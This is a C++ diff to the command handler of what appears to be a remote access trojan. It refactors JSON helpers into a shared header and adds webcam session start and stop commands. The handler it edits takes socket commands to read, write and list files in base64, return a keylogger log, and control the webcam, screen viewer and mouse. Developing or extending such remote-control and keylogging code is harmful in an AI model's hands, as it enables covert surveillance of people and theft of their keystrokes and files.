@@ -10,18 +10,11 @@
 #include "webcam.h"
 #include "mouse_control.h"
 #include "screen_viewer.h"
+#include "utils.h"
 
 #include <sstream>
 #include <vector>
 #include <string>
-
-// ===== UTILS =====
-static std::string trim(const std::string& input) {
-    const auto start = input.find_first_not_of(" \t\r\n");
-    if (start == std::string::npos) return "";
-    const auto end = input.find_last_not_of(" \t\r\n");
-    return input.substr(start, end - start + 1);
-}
 
 static std::vector<std::string> split(const std::string& s) {
     std::istringstream iss(s);
@@ -29,23 +22,6 @@ static std::vector<std::string> split(const std::string& s) {
     std::string t;
     while (iss >> t) out.push_back(t);
     return out;
-}
-
-static std::string escapeJson(const std::string& input) {
-    std::string out;
-    for (char c : input) {
-        if (c == '\\') out += "\\\\";
-        else if (c == '"') out += "\\\"";
-        else if (c == '\n') out += "\\n";
-        else out += c;
-    }
-    return out;
-}
-
-static std::string json(bool ok, const std::string& msg, const std::string& cmd = "") {
-    return "{\"ok\":" + std::string(ok ? "true" : "false") +
-        ",\"command\":\"" + cmd +
-        "\",\"message\":\"" + escapeJson(msg) + "\"}";
 }
 
 /** Everything after `cmd` + one space (paths / names with spaces). */
@@ -73,11 +49,11 @@ static bool parseWriteFileBase64Line(const std::string& t, std::string& b64, std
 std::string process(const std::string& line, SocketType client) {
     const std::string t = trim(line);
     if (t.empty())
-        return json(false, "empty");
+        return jsonCommandResponse(false, "empty");
 
     auto parts = split(t);
     if (parts.empty())
-        return json(false, "empty");
+        return jsonCommandResponse(false, "empty");
 
     const std::string& cmd = parts[0];
 
@@ -106,20 +82,20 @@ std::string process(const std::string& line, SocketType client) {
 
     if (cmd == "READ_FILE_BASE64") {
         const std::string path = argAfterCommand(t, "READ_FILE_BASE64");
-        if (path.empty()) return json(false, "missing_path", cmd);
+        if (path.empty()) return jsonCommandResponse(false, "missing_path", cmd);
         return readFileBase64Json(path);
     }
 
     if (cmd == "WRITE_FILE_BASE64") {
         std::string b64;
         std::string path;
-        if (!parseWriteFileBase64Line(t, b64, path)) return json(false, "bad_args", cmd);
+        if (!parseWriteFileBase64Line(t, b64, path)) return jsonCommandResponse(false, "bad_args", cmd);
         return writeFileBase64Json(path, b64);
     }
 
     if (cmd == "LIST_FILES") {
         const std::string dir = argAfterCommand(t, "LIST_FILES");
-        if (dir.empty()) return json(false, "missing_dir", cmd);
+        if (dir.empty()) return jsonCommandResponse(false, "missing_dir", cmd);
         return listFilesJson(dir);
     }
 
@@ -128,7 +104,11 @@ std::string process(const std::string& line, SocketType client) {
     if (cmd == "KEYLOGGER_GET_LOG") return keyloggerGetLogJson();
 
     if (cmd == "WEBCAM_START") {
-        return startWebcamJson();
+        return webcamStartSession(client);
+    }
+    if (cmd == "WEBCAM_STOP") {
+        webcamStopSession();
+        return "{\"ok\":true,\"command\":\"WEBCAM_STOP\"}";
     }
     if (cmd == "WEBCAM_RECORD_START") {
         return startWebcamRecordJson();
@@ -163,5 +143,5 @@ std::string process(const std::string& line, SocketType client) {
         return "{\"ok\":true,\"command\":\"SCREEN_VIEWER_STOP\"}";
     }
 
-    return json(false, "unknown_command", cmd);
+    return jsonCommandResponse(false, "unknown_command", cmd);
 }
